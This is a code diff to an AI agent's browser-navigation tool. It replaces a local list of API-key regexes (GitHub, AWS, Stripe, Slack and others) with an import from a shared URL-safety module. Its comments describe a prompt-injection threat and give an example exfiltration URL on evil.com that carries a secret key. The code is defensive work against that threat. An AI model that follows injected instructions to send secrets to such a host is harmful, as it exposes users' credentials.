@@ -48,57 +48,17 @@ from typing import Any, Optional
 
 from ..registry import registry, tool_error
 from . import _browser_driver as drv
-from ._url_safety import is_safe_url
+from ._url_safety import _PREFIX_RE, is_safe_url
 
 # URL schemes a browser navigation may use. Everything else (file:, ftp:,
 # data:, chrome:, view-source:, …) is rejected — file:// in particular would
 # read host secrets, since the OS jail binds the whole host root read-only.
 _ALLOWED_SCHEMES = frozenset({"http", "https", "about"})
 
-# Secret-exfil guard regex — ported from hermes agent/redact._PREFIX_RE /
-# _PREFIX_PATTERNS. A prompt injection could trick the chara into navigating to
-# https://evil.com/steal?key=sk-ant-... to exfiltrate a secret; block those.
-_PREFIX_PATTERNS = [
-    r"sk-[A-Za-z0-9_-]{10,}",
-    r"ghp_[A-Za-z0-9]{10,}",
-    r"github_pat_[A-Za-z0-9_]{10,}",
-    r"gho_[A-Za-z0-9]{10,}",
-    r"ghu_[A-Za-z0-9]{10,}",
-    r"ghs_[A-Za-z0-9]{10,}",
-    r"ghr_[A-Za-z0-9]{10,}",
-    r"xox[baprs]-[A-Za-z0-9-]{10,}",
-    r"AIza[A-Za-z0-9_-]{30,}",
-    r"pplx-[A-Za-z0-9]{10,}",
-    r"fal_[A-Za-z0-9_-]{10,}",
-    r"fc-[A-Za-z0-9]{10,}",
-    r"bb_live_[A-Za-z0-9_-]{10,}",
-    r"gAAAA[A-Za-z0-9_=-]{20,}",
-    r"AKIA[A-Z0-9]{16}",
-    r"sk_live_[A-Za-z0-9]{10,}",
-    r"sk_test_[A-Za-z0-9]{10,}",
-    r"rk_live_[A-Za-z0-9]{10,}",
-    r"SG\.[A-Za-z0-9_-]{10,}",
-    r"hf_[A-Za-z0-9]{10,}",
-    r"r8_[A-Za-z0-9]{10,}",
-    r"npm_[A-Za-z0-9]{10,}",
-    r"pypi-[A-Za-z0-9_-]{10,}",
-    r"dop_v1_[A-Za-z0-9]{10,}",
-    r"doo_v1_[A-Za-z0-9]{10,}",
-    r"am_[A-Za-z0-9_-]{10,}",
-    r"sk_[A-Za-z0-9_]{10,}",
-    r"tvly-[A-Za-z0-9]{10,}",
-    r"exa_[A-Za-z0-9]{10,}",
-    r"gsk_[A-Za-z0-9]{10,}",
-    r"syt_[A-Za-z0-9]{10,}",
-    r"retaindb_[A-Za-z0-9]{10,}",
-    r"hsk-[A-Za-z0-9]{10,}",
-    r"mem0_[A-Za-z0-9]{10,}",
-    r"brv_[A-Za-z0-9]{10,}",
-    r"xai-[A-Za-z0-9]{30,}",
-]
-_PREFIX_RE = re.compile(
-    r"(?<![A-Za-z0-9_-])(" + "|".join(_PREFIX_PATTERNS) + r")(?![A-Za-z0-9_-])"
-)
+# Secret-exfil guard: a prompt injection could trick the chara into navigating to
+# https://evil.com/steal?key=sk-ant-… to exfiltrate a secret. The pattern list +
+# compiled regex are the SAME source as the URL screen (_url_safety), imported above
+# so the browser guard and the fetch guard never drift apart.
 
 # Cloud-metadata / IMDS endpoints — always blocked regardless of backend
 # (hermes _is_always_blocked_url): no legitimate browser use, and routing them
